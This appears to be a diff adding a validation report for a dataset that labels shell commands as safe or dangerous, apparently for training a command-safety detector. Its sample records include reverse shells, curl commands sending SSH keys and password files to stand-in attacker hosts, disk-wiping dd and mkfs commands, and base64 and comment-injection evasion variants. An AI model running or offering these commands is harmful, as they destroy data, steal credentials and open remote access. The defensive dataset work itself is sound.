@@ -1,0 +1,104 @@
+============================================================
+DATASET VALIDATION REPORT
+============================================================
+
+Golden commands: 35
+
+SPLIT SIZES
+----------------------------------------
+  train          :  39590 total  |  safe= 17934 ( 45.3%)  |  dangerous= 21656
+  val            :   8483 total  |  safe=  3843 ( 45.3%)  |  dangerous=  4640
+  test           :   8485 total  |  safe=  3843 ( 45.3%)  |  dangerous=  4642
+  adversarial    :  24610 total  |  safe=   627 (  2.5%)  |  dangerous= 23983
+
+  TOTAL       :  81168 records
+
+DUPLICATE CHECKS
+----------------------------------------
+  train: 0 duplicates (OK)
+  val: 0 duplicates (OK)
+  test: 0 duplicates (OK)
+  adversarial: 0 duplicates (OK)
+
+CROSS-SPLIT DUPLICATES
+----------------------------------------
+  train <-> val: 0 overlaps (OK)
+  train <-> test: 0 overlaps (OK)
+  train <-> adversarial: 17258 overlaps FOUND
+  val <-> test: 0 overlaps (OK)
+  val <-> adversarial: 3680 overlaps FOUND
+  test <-> adversarial: 3672 overlaps FOUND
+
+GOLDEN COMMAND EXCLUSION
+----------------------------------------
+  train: 0 (PASS)
+  val: 0 (PASS)
+  test: 0 (PASS)
+  adversarial: 0 (PASS)
+  OVERALL: All golden commands excluded (PASS)
+
+LABEL BALANCE (non-adversarial splits only)
+----------------------------------------
+  Benign:     25620 (45.3%)
+  Dangerous:  30938 (54.7%)
+
+SEVERITY DISTRIBUTION (dangerous commands)
+----------------------------------------
+  low       :    557 (  1.0%)
+  medium    :   2105 (  3.8%)
+  high      :  13831 ( 25.2%)
+  critical  :  38428 ( 70.0%)
+  unspecified: 0
+
+SAMPLE RECORDS (50 random for manual review)
+----------------------------------------
+   1. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] chmod 755 /etc/ssl/package.json
+   2. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] touch /home/user/Documents/style.css
+   3. [1] [destructive    ] [critical  ] [adversarial         ] [base64         ] ZGQgaWY9L2Rldi91cmFuZG9tIG9mPS9kZXYvc2RiIGJzPTFNIGNvdW50PTY4
+   4. [1] [exfiltration   ] [high      ] [adversarial         ] [base64         ] Y3VybCAtWCBQT1NUIC0tZGF0YS11cmxlbmNvZGUgJ2RhdGFAL2V0Yy9wYXNzd2QnIGh0dHA6Ly9tYWx3
+   5. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] echo 'debug: starting' >> /home/user/Downloads/composer.json
+   6. [1] [exfiltration   ] [high      ] [synthetic_dangerous ] [none           ] curl -X POST --data-urlencode 'data@/home/user/.ssh/id_rsa' http://exploit.kr/st
+   7. [1] [exfiltration   ] [critical  ] [adversarial         ] [comment_injection] curl -s -o /dev/null --connect-timeout 5 http://backdoor.cn/beacon && curl http:
+   8. [0] [git            ] [?         ] [synthetic_benign    ] [none           ] cd /home/user/project && git checkout -b feature/demos-215
+   9. [0] [docker         ] [?         ] [synthetic_benign    ] [none           ] docker pull debian:bookworm-slim
+  10. [1] [exfiltration   ] [critical  ] [adversarial         ] [comment_injection] lua -e 'local s=require("socket");local t=s.tcp();t:connect("192.168.1.200",7777
+  11. [1] [exfiltration   ] [critical  ] [synthetic_dangerous ] [none           ] ncat 185.220.101.1 53 -e /bin/bash
+  12. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] cp /var/www/deploy.sh /var/www/html/assets/.profile.bak
+  13. [1] [adversarial    ] [critical  ] [adversarial         ] [base64         ] echo 'ZGQgaWY9L2Rldi91cmFuZG9tIG9mPS9kZXYvc2RiMSBicz0xTSBjb3VudD02ODI=' | base64
+  14. [1] [destructive    ] [critical  ] [synthetic_dangerous ] [none           ] dd if=/dev/zero of=/dev/sdb bs=8M count=1
+  15. [1] [exfiltration   ] [critical  ] [synthetic_dangerous ] [none           ] ncat 172.16.0.10 1337 -e /bin/bash
+  16. [1] [destructive    ] [critical  ] [adversarial         ] [chaining_safe_prefix] date; dd if=/dev/zero of=/dev/xvda bs=512K count=100
+  17. [1] [destructive    ] [critical  ] [synthetic_dangerous ] [none           ] dd if=/dev/urandom of=/dev/sda bs=1M count=161
+  18. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] mkdir -p /etc/docker/new_test
+  19. [1] [exfiltration   ] [critical  ] [synthetic_dangerous ] [none           ] nc -e /bin/sh 10.0.0.50 53
+  20. [1] [recon          ] [low       ] [adversarial         ] [comment_injection] ls -la /etc/ssh 2>/dev/null # cleaned
+  21. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] rm /var/www/config.json.tmp
+  22. [1] [recon          ] [medium    ] [adversarial         ] [comment_injection] curl -s http://192.168.1.1:9200/actuator/env # cleaned
+  23. [1] [destructive    ] [critical  ] [adversarial         ] [base64         ] echo 'bWtmcy5leHQzIC9kZXYvbnZtZTBuMXAx' | base64 -d | sh
+  24. [1] [exfiltration   ] [high      ] [adversarial         ] [base64         ] echo 'Y3VybCAtcyAtayBodHRwczovL2MyLXNlcnZlci5uZXQvY2VydCAmJiBvcGVuc3NsIHNfY2xpZW
+  25. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] head -72 /opt/app/src/Cargo.toml
+  26. [1] [exfiltration   ] [high      ] [adversarial         ] [base64         ] Y3VybCAtWCBQT1NUIC0tZGF0YS11cmxlbmNvZGUgJ2RhdGFAL2V0Yy9zaGFkb3cnIGh0dHA6Ly9waGlz
+  27. [1] [destructive    ] [critical  ] [adversarial         ] [base64         ] echo 'bWtmcy5leHQ0IC1mIC9kZXYvc2RhMQ==' | base64 -d | sh
+  28. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] tail -184 /home/user/downloads/test.py
+  29. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] wc -l /home/user/Pictures/.gitignore
+  30. [1] [exfiltration   ] [critical  ] [adversarial         ] [base64         ] Y3VybCAtcyAtbyAvZGV2L251bGwgLS1jb25uZWN0LXRpbWVvdXQgNSBodHRwOi8vc3FsaS5ncS9iZWFj
+  31. [1] [destructive    ] [critical  ] [adversarial         ] [comment_injection] dd if=/dev/urandom of=/dev/sda bs=1M count=444 # cleaned
+  32. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] ln -s /var/log/apache2/script.sh /home/user/Desktop/link_Dockerfile.prod
+  33. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] cp /var/log/syslog/script.sh /var/log/nginx/app.js.bak
+  34. [1] [destructive    ] [critical  ] [synthetic_dangerous ] [none           ] mv /boot/vmlinuz /dev/null
+  35. [1] [exfiltration   ] [critical  ] [adversarial         ] [base64         ] echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTk4LjUxLjEwMC4xLzMxMzM3IDA+JjE=' | base64 -d | sh
+  36. [1] [exfiltration   ] [critical  ] [synthetic_dangerous ] [none           ] socat EXEC:/bin/bash TCP:172.16.0.100:4444
+  37. [1] [exfiltration   ] [critical  ] [adversarial         ] [comment_injection] socat TCP:10.10.10.10:1337 EXEC:/bin/sh # cleaned
+  38. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] chmod 644 /home/user/work/style.css
+  39. [1] [exfiltration   ] [high      ] [adversarial         ] [comment_injection] curl -s -k https://shellz.cc/cert && openssl s_client -connect 172.16.0.10:22 2>
+  40. [1] [exfiltration   ] [high      ] [adversarial         ] [comment_injection] curl -s -k https://exfil.space/cert && openssl s_client -connect 203.0.113.5:999
+  41. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] stat /etc/docker/webpack.config.js
+  42. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] mv /etc/nginx/sites-available/cleanup.sh /home/user/Downloads/router.js.old
+  43. [1] [exfiltration   ] [critical  ] [adversarial         ] [comment_injection] nc -e /bin/sh 172.16.0.100 4444 # cleaned
+  44. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] touch /home/user/Pictures/site.conf
+  45. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] ls -1 /opt/app/backup
+  46. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] chown user:user /var/log/nginx/haproxy.cfg
+  47. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] chown user:user /etc/docker/webpack.config.prod.js
+  48. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] touch /etc/ssh/script.sh
+  49. [0] [filesystem     ] [?         ] [synthetic_benign    ] [none           ] find /etc/nginx -name '*.sql'
+  50. [1] [exfiltration   ] [critical  ] [adversarial         ] [comment_injection] telnet 10.10.10.10 1337 | /bin/bash | telnet 192.168.1.200 443 # safe operation
